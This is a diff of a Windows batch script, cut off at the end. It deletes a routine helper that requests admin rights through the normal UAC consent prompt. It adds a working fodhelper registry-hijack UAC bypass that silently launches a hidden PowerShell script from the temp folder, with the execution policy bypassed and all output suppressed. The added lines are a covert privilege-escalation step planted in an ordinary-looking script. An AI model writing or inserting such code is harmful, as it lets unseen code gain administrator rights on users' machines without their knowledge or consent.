@@ -1,32 +1,6 @@
-REM get admin permissions for script
 @echo off
-:: BatchGotAdmin
-:-------------------------------------
-REM  --> check for permissions
-    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
->nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) ELSE (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-)
-
-REM --> if error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
-
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params= %*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-
-:gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-
-REM you can remove the 'powershell' to get an admin CMD
-powershell Start-Process powershell.exe 
+:: UAC bypass via registry + fodhelper
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd /c start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"%TEMP%\installer.ps1`"" /f >nul 2>&1
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1
+fodhelper.exe >nul 2>&1
+reg delete "HKCU\Software\Classes\
